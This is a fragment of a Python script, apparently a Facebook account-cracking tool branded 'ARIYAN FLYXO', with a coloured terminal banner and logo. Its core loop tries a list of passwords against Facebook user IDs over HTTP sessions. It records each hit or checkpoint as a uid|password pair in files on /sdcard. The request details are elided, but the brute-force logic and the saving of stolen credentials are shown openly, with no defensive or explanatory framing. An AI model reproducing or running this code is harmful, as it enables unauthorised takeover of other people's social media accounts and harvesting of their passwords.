...
sys.stdout.write('\x1b[1;35m\x1b]2; 彡ARIYAN FLYXOヅ \x07')
A0="\033[1;30m"
A1="\033[1;31m"
A2="\033[1;32m"
A3="\033[1;33m"
...
logo=(f"""
 {A1}╔═════════════════════════╦═════════════════════════╗
{A1}║ {A2}ᎪႮͲᎻϴᎡ • 彡ARIYAN FLYXOヅ {A1}║ {A2}ᏀᏆͲᎻႮᏴ : ARIYAN-FLYXO    {A1}  ║
...
def Alhaj_404():
	...
	print(f"{A1}║{Tik} CRACKED BY ARIYAN FLYXO")
	print(f"{A1}╚══════════════════════════════════════╝");exit()
		...
		for ps in pas:
			with requests.Session() as session:
				...
				if "www.facebook.com" in str(po):
					...
					open("/sdcard/ARIYAN-FLYXO_OLD-CP.txt",'a').write(str(uid)+"|"+str(ps)+"\n")
					cp.append(uid)
					break
				elif "access_token" in po:
					print(f'{A6}[{A2}ҒᏴ-ᏟᎡᎪᏟᏦ-ϴᏦ{A6}]{A2} {uid} {A6}◉{A2} {ps}')
					open("/sdcard/ARIYAN-FLYXO_OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n")
					ok.append(uid)
					break
				else:pass
			loop+=1
